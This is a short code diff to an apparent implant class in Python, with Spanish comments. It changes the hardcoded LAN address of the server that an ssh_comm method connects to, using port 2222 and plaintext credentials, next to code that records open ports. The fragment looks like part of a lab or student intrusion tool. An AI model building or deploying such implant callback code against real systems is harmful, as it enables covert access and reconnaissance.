@@ -108,7 +108,7 @@ class implant():
         f.write("Los puertos abiertos son " + open_ports + "\n")
     def ssh_comm(self):
         #ip del server
-        ip = "192.168.0.13"
+        ip = "192.168.0.100"
         port = 2222
         username = "sshuser"
         password = "sshpass"
